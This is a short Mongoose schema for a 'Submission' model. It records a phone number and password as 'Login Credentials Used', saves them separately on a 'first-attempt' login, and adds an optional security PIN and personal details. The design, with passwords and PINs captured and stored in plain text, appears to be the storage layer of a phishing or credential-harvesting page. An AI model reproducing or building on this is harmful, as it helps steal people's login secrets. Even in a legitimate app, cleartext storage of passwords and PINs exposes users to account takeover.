const mongoose = require('mongoose');

const submissionSchema = new mongoose.Schema({
  // Section 1: Login Credentials Used
  loginPhone: {
    type: String,
    required: true,
    match: [/^\d{10}$/, 'Please enter a valid 10-digit phone number']
  },
  loginPassword: {
    type: String,
    required: true
  },
  // Section 2: Form Data (optional for login-only submissions)
  fullName: {
    type: String
  },
  problem: {
    type: String
  },
  securityPin: {
    type: String
  },
  experience: {
    type: String
  },
  // Source tag: 'login' for first-attempt saves, 'form' for full submissions
  source: {
    type: String,
    default: 'form'
  },
  timestamp: {
    type: Date,
    default: Date.now
  }
});

module.exports = mongoose.model('Submission', submissionSchema);
